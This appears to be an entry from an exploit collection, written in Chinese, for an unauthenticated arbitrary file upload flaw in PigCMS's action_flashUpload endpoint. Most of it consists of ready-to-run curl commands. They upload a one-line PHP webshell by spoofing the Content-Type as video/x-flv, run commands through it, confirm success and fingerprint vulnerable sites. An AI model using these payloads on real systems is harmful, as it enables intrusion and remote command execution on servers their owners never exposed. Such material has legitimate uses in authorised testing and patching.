---
id: PIGCMS-UPLOAD
title: PigCMS action_flashUpload 任意文件上传漏洞
product: pigcms
vendor: PigCMS
version_affected: "PigCMS"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产]
fingerprint: ["PigCMS", "pigcms"]
---

## 漏洞描述

PigCMS 的 `action_flashUpload` 方法存在任意文件上传漏洞。该接口未对上传文件的扩展名做有效校验，仅检查 Content-Type，攻击者可通过伪造 Content-Type 上传 PHP webshell。

## 影响版本

- PigCMS

## 前置条件

- 无需认证

## 利用步骤

1. 向 `/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload` 发送 multipart POST
2. 设置 Content-Type 为 video/x-flv 绕过检查
3. 从响应中获取上传路径，访问 webshell

## Payload

### 上传 webshell

```bash
curl -s "http://target/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload" \
  -F "filePath=@shell.php;filename=test.php;type=video/x-flv"
```

### 一行式上传

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s "http://target/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload" \
  -F "filePath=@/tmp/shell.php;filename=cmd.php;type=video/x-flv"
```

### 访问 webshell

```bash
# 上传路径格式: /cms/upload/images/YYYY/MM/DD/TIMESTAMPxxxx.php
curl -s "http://target/cms/upload/images/2025/04/05/cmd.php?cmd=id"
```

## 验证方法

```bash
# 上传后从响应中获取文件路径并访问
curl -s "http://target/cms/upload/images/2025/04/05/cmd.php?cmd=id" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "PigCMS"
```
